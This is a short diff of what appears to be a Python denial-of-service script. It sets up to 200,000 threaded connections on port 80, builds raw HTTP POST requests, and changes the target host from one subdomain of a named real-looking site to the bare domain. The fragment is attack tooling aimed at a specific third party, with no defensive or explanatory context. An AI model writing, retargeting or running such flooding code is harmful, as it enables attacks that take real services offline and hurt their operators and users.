@@ -7,7 +7,7 @@ import threading
 # ---------------------------
 MAX_CONN = 200000
 PORT = 80
-HOST = "shell.chinasummer.org"
+HOST = "chinasummer.org"
 PAGE = "/"
 # ---------------------------
 buf = ("POST %s HTTP/1.1\r\n"
